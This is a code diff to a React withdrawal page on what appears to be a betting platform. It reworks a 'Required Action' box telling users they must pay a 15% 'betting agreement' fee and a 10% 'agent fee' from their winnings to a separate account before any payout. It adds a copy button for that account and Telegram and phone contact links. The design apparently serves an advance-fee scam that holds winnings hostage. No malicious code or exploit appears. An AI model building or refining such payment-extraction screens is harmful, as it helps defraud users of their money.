@@ -37,6 +37,9 @@ export default function WithdrawPage() {
   const [success, setSuccess] = useState(false);
   const [error, setError] = useState('');
   const [feeAccount, setFeeAccount] = useState('');
+  const [contactPhone, setContactPhone] = useState('');
+  const [telegramUsername, setTelegramUsername] = useState('');
+  const [copied, setCopied] = useState(false);
 
   useEffect(() => { setMounted(true); }, []);
 
@@ -57,12 +60,66 @@ export default function WithdrawPage() {
       setMethods(active);
       if (settingsData && settingsData.fee_account) {
         setFeeAccount(settingsData.fee_account);
+        setContactPhone(settingsData.contact_phone || '');
+        setTelegramUsername(settingsData.telegram_username || '');
       }
       if (pendingData && pendingData.id) {
         setPendingWithdrawal(pendingData);
       }
     }).catch(console.error).finally(() => setLoading(false));
   }, [mounted, router]);
+
+  const handleCopy = (text: string) => {
+    if (!text) return;
+    navigator.clipboard.writeText(text);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+  };
+
+  const renderFeeNotification = () => (
+    <div style={{ background: 'rgba(245, 166, 35, 0.1)', border: '1px solid rgba(245, 166, 35, 0.3)', borderRadius: '12px', padding: '16px', marginBottom: '24px', width: '100%', maxWidth: '340px', textAlign: 'left' }}>
+      <p style={{ color: '#F5A623', fontSize: '14px', fontWeight: 700, marginBottom: '8px' }}>? Required Action</p>
+      <p style={{ color: '#FFF', fontSize: '13px', lineHeight: 1.5, marginBottom: '12px' }}>
+        Before the withdrawal is processed, the customer must pay a <b>BETTING AGREEMENT 15%</b> fee and an <b>AGENT FEE 10%</b> from the won amount.
+      </p>
+      <div style={{ background: '#111827', padding: '12px', borderRadius: '8px', border: '1px solid #1E293B', color: '#FFF', fontSize: '13px' }}>
+        <div style={{ color: '#9CA3AF', fontSize: '11px', textTransform: 'uppercase', marginBottom: '8px' }}>Send Fee To:</div>
+        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', gap: '12px' }}>
+          <div style={{ whiteSpace: 'pre-line', wordBreak: 'break-word', flex: 1 }}>{feeAccount}</div>
+          <button
+            onClick={() => handleCopy(feeAccount)}
+            style={{ background: 'rgba(255,255,255,0.1)', border: 'none', color: '#FFF', padding: '6px 10px', borderRadius: '6px', cursor: 'pointer', fontSize: '12px', display: 'flex', alignItems: 'center', gap: '4px' }}
+          >
+            {copied ? (
+              <><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#10B981" strokeWidth="2"><polyline points="20 6 9 17 4 12"></polyline></svg> Copied</>
+            ) : (
+              <><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg> Copy</>
+            )}
+          </button>
+        </div>
+      </div>
+      
+      {(contactPhone || telegramUsername) && (
+        <div style={{ marginTop: '16px', display: 'flex', gap: '10px', flexDirection: 'column' }}>
+          <div style={{ fontSize: '13px', color: '#9CA3AF', marginBottom: '4px' }}>Need help? Contact support:</div>
+          <div style={{ display: 'flex', gap: '10px' }}>
+            {contactPhone && (
+              <a href={`tel:${contactPhone}`} style={{ flex: 1, textDecoration: 'none', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px', background: '#3B82F6', color: '#FFF', padding: '10px', borderRadius: '8px', fontSize: '14px', fontWeight: 600 }}>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                Call Us
+              </a>
+            )}
+            {telegramUsername && (
+              <a href={telegramUsername.startsWith('http') ? telegramUsername : `https://t.me/${telegramUsername.replace('@', '')}`} target="_blank" rel="noopener noreferrer" style={{ flex: 1, textDecoration: 'none', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px', background: '#0088cc', color: '#FFF', padding: '10px', borderRadius: '8px', fontSize: '14px', fontWeight: 600 }}>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+                Telegram
+              </a>
+            )}
+          </div>
+        </div>
+      )}
+    </div>
+  );
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -136,18 +193,7 @@ export default function WithdrawPage() {
           </div>
           <h2 style={{ fontSize: '22px', fontWeight: 900, color: '#FFF', marginBottom: '12px' }}>Withdrawal Pending</h2>
           
-          {feeAccount ? (
-            <div style={{ background: 'rgba(245, 166, 35, 0.1)', border: '1px solid rgba(245, 166, 35, 0.3)', borderRadius: '12px', padding: '16px', marginBottom: '24px', maxWidth: '340px', textAlign: 'left' }}>
-              <p style={{ color: '#F5A623', fontSize: '14px', fontWeight: 700, marginBottom: '8px' }}>? Required Action</p>
-              <p style={{ color: '#FFF', fontSize: '13px', lineHeight: 1.5, marginBottom: '12px' }}>
-                Before the withdrawal is processed, the customer must pay a <b>BETTING AGREEMENT 15%</b> fee and an <b>AGENT FEE 10%</b> from the won amount.
-              </p>
-              <div style={{ background: '#111827', padding: '12px', borderRadius: '8px', border: '1px solid #1E293B', color: '#FFF', fontSize: '13px', whiteSpace: 'pre-line' }}>
-                <div style={{ color: '#9CA3AF', fontSize: '11px', textTransform: 'uppercase', marginBottom: '4px' }}>Send Fee To:</div>
-                {feeAccount}
-              </div>
-            </div>
-          ) : (
+          {feeAccount ? renderFeeNotification() : (
             <p style={{ color: '#9CA3AF', fontSize: '15px', lineHeight: 1.6, maxWidth: '300px', marginBottom: '32px' }}>
               Your withdrawal is currently being processed by an admin. You can submit another request once this one is completed.
             </p>
@@ -190,22 +236,15 @@ export default function WithdrawPage() {
           Your withdrawal request is being processed. The amount has been deducted from your balance.
         </p>
         {feeAccount ? (
-          <div style={{ background: 'rgba(245, 166, 35, 0.1)', border: '1px solid rgba(245, 166, 35, 0.3)', borderRadius: '12px', padding: '20px', marginTop: '24px', maxWidth: '340px', textAlign: 'left' }}>
-            <p style={{ color: '#F5A623', fontSize: '15px', fontWeight: 700, marginBottom: '8px' }}>? Required Action</p>
-            <p style={{ color: '#FFF', fontSize: '14px', lineHeight: 1.5, marginBottom: '16px' }}>
-              Before the withdrawal is processed, the customer must pay a <b>BETTING AGREEMENT 15%</b> fee and an <b>AGENT FEE 10%</b> from the won amount.
-            </p>
-            <div style={{ background: '#111827', padding: '16px', borderRadius: '8px', border: '1px solid #1E293B', color: '#FFF', fontSize: '14px', whiteSpace: 'pre-line' }}>
-              <div style={{ color: '#9CA3AF', fontSize: '12px', textTransform: 'uppercase', marginBottom: '4px' }}>Send Fee To:</div>
-              {feeAccount}
-            </div>
+          <>
+            {renderFeeNotification()}
             <button 
               onClick={() => router.push('/')}
-              style={{ width: '100%', padding: '14px', background: '#F5A623', color: '#000', border: 'none', borderRadius: '10px', fontWeight: 700, marginTop: '20px', fontSize: '15px', cursor: 'pointer' }}
+              style={{ width: '100%', maxWidth: '340px', padding: '14px', background: '#F5A623', color: '#000', border: 'none', borderRadius: '10px', fontWeight: 700, fontSize: '15px', cursor: 'pointer' }}
             >
               I Understand
             </button>
-          </div>
+          </>
         ) : (
           <div style={{ marginTop: '24px', display: 'flex', gap: '8px', alignItems: 'center', color: '#6B7280', fontSize: '13px' }}>
             <div style={{ width: '18px', height: '18px', border: '2px solid #19E66B', borderTop: '2px solid transparent', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }} />
